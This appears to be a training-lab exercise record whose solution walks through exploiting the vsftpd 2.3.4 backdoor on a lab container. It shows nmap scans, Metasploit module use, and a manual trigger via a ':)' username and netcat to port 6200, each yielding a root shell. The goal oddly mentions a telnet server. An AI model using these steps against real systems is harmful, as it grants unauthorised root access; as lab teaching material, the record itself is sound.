{"description":"Metasploit example","goal":"<p>Try to obtain accesso to telnet server</p>","solution":"<p>&nbsp;</p>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">kali@b9e90db86b8f:~$ nmap -p 21 172.18.0.2                                                                                 </span></div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Starting&nbsp;Nmap&nbsp;7.40&nbsp;(&nbsp;<a style=\"text-decoration: none; color: inherit;\" href=\"https://nmap.org/\" target=\"vt100Link\">https://nmap.org</a>&nbsp;)&nbsp;at&nbsp;2017-05-29&nbsp;07:04&nbsp;UTC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Nmap scan report for hackftp_vulnFTP_1.hackftp_default (172.18.0.2)                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Host is up (0.00021s latency).                                                                                             </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">PORT   STATE SERVICE                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">21/tcp open  ftp                                                                                                           </span></div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds                                                                </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">kali@b9e90db86b8f:~$ nmap -p 21 -sV 172.18.0.2                                                                             </span></div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Starting&nbsp;Nmap&nbsp;7.40&nbsp;(&nbsp;<a style=\"text-decoration: none; color: inherit;\" href=\"https://nmap.org/\" target=\"vt100Link\">https://nmap.org</a>&nbsp;)&nbsp;at&nbsp;2017-05-29&nbsp;07:04&nbsp;UTC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Nmap scan report for hackftp_vulnFTP_1.hackftp_default (172.18.0.2)                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Host is up (0.00023s latency).                                                                                             </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">PORT   STATE SERVICE VERSION                                                                                               </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">21/tcp open  ftp     vsftpd 2.3.4                                                                                          </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Service Info: OS: Unix                                                                                                     </span></div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;<a style=\"text-decoration: none; color: inherit;\" href=\"https://nmap.org/submit/\" target=\"vt100Link\">https://nmap.org/submit/</a>&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds                                                                </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">kali@b9e90db86b8f:~$   </span></div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">The version is 2.3.4</span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">By doing an online research we found that this is a very vulnerable ftp version and there is a metasploit m</span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">odule to exploit it:</span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\"><a href=\"https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor\">https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor</a></span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\"><a href=\"https://www.exploit-db.com/exploits/17491/\">https://www.exploit-db.com/exploits/17491/</a></span></div>\n<p>It was an ftp version with a backdoor inside it, enabled by using a username that ended with :) ! Let's see different exploit techniques:</p>\n<h2 style=\"text-align: center;\">METASPLOIT METHOD</h2>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\" style=\"text-decoration: underline;\">msf</span><span class=\"ansiDef bgAnsiDef\"> &gt; use exploit/unix/ftp/vsftpd_234_backdoor                                                                             </span></div>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\" style=\"text-decoration: underline;\">msf</span><span class=\"ansiDef bgAnsiDef\"> exploit(</span><span class=\"ansi9 bgAnsiDef\" style=\"color: #ff0000; font-weight: bold;\">vsftpd_234_backdoor</span><span class=\"ansiDef bgAnsiDef\">) &gt; show options</span></div>\n<div class=\"scrollback\" style=\"height: 18px;\">&nbsp;</div>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Module options (exploit/unix/ftp/vsftpd_234_backdoor):                                                                     </span></div>\n<div class=\"scrollback\" style=\"height: 18px;\">&nbsp;</div>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">   Name   Current Setting  Required  Description                                                                           </span></div>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">   ----   ---------------  --------  -----------                                                                           </span></div>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">   RHOST                   yes       The target address                                                                    </span></div>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">   RPORT  21               yes       The target port                                                                       </span></div>\n<div class=\"scrollback\" style=\"height: 18px;\">&nbsp;</div>\n<div class=\"scrollback\" style=\"height: 18px;\">&nbsp;</div>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Exploit target:                                                                                                            </span></div>\n<div class=\"scrollback\" style=\"height: 18px;\">&nbsp;</div>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">   Id  Name                                                                                                                </span></div>\n<div class=\"scrollback\" style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">   --  ----                                                                                                                </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">   0   Automatic                                                                                                           </span></div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\" style=\"text-decoration: underline;\">msf</span><span class=\"ansiDef bgAnsiDef\"> exploit(</span><span class=\"ansi9 bgAnsiDef\" style=\"color: #ff0000; font-weight: bold;\">vsftpd_234_backdoor</span><span class=\"ansiDef bgAnsiDef\">) &gt; set RHOST 172.18.0.2                                                                    </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">RHOST =&gt; 172.18.0.2                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\" style=\"text-decoration: underline;\">msf</span><span class=\"ansiDef bgAnsiDef\"> exploit(</span><span class=\"ansi9 bgAnsiDef\" style=\"color: #ff0000; font-weight: bold;\">vsftpd_234_backdoor</span><span class=\"ansiDef bgAnsiDef\">) &gt; run</span></div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\"><span class=\"ansi12 bgAnsiDef\" style=\"color: #5c5cff; font-weight: bold;\">[*]</span><span class=\"ansiDef bgAnsiDef\"> 172.18.0.2:21 - Banner: 220 (vsFTPd 2.3.4)</span></div>\n<div style=\"height: 18px;\"><span class=\"ansi12 bgAnsiDef\" style=\"color: #5c5cff; font-weight: bold;\">[*]</span><span class=\"ansiDef bgAnsiDef\"> 172.18.0.2:21 - USER: 331 Please specify the password.</span></div>\n<div style=\"height: 18px;\"><span class=\"ansi10 bgAnsiDef\" style=\"color: #00ff00; font-weight: bold;\">[+]</span><span class=\"ansiDef bgAnsiDef\"> 172.18.0.2:21 - Backdoor service has been spawned, handling...</span></div>\n<div style=\"height: 18px;\"><span class=\"ansi10 bgAnsiDef\" style=\"color: #00ff00; font-weight: bold;\">[+]</span><span class=\"ansiDef bgAnsiDef\"> 172.18.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)</span></div>\n<div style=\"height: 18px;\"><span class=\"ansi12 bgAnsiDef\" style=\"color: #5c5cff; font-weight: bold;\">[*]</span><span class=\"ansiDef bgAnsiDef\"> Found shell.</span></div>\n<div style=\"height: 18px;\"><span class=\"ansi12 bgAnsiDef\" style=\"color: #5c5cff; font-weight: bold;\">[*]</span><span class=\"ansiDef bgAnsiDef\"> Command shell session 1 opened (172.18.0.3:34931 -&gt; 172.18.0.2:6200) at 2017-05-29 07:17:15 +0000</span></div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">whoami                                                                                                                     </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">root                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">ls                                                                                                                         </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">bin                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">boot                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">dev                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">etc                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">home                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">lib                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">media                                                                                                                      </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">mnt                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">opt                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">proc                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">root                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">run                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">sbin                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">srv                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">sys                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">tmp                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">usr                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">var                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">vsfptd     </span></div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<div>Reset the lab and try different way to exploit it! Look at these:</div>\n<div><a href=\"https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html\">https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html</a></div>\n<div>There is no need to use metasploit:</div>\n<div>&nbsp;</div>\n<div>&nbsp;</div>\n<div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">kali@5903cb9b158a:~$ ftp 192.18.0.2                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">^Ckali@5903cb9b158a:~$ ftp 172.18.0.2                                                                                      </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Connected to 172.18.0.2.                                                                                                   </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">220 (vsFTPd 2.3.4)                                                                                                         </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Name (172.18.0.2:kali): 12345:)                                                                                            </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">331 Please specify the password.                                                                                           </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">Password:                                                                                                                  </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">^C                                                                                                                         </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">421 Service not available, remote server has closed connection                                                             </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">kali@5903cb9b158a:~$ nc -v 172.18.0.2 6200                                                                                 </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">hackftp_vulnFTP_1.hackftp_default [172.18.0.2] 6200 (?) open                                                               </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">whoami                                                                                                                     </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">root                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">ls                                                                                                                         </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">bin                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">boot                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">dev                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">etc                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">home                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">lib                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">media                                                                                                                      </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">mnt                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">opt                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">proc                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">root                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">run                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">sbin                                                                                                                       </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">srv                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">sys                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">tmp                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">usr                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">var                                                                                                                        </span></div>\n<div style=\"height: 18px;\"><span class=\"ansiDef bgAnsiDef\">vsfptd </span></div>\n</div>\n<div style=\"height: 18px;\">&nbsp;</div>\n<p style=\"text-align: center;\">&nbsp;</p>\n<p style=\"text-align: left;\">&nbsp;</p>","author":"giper"}
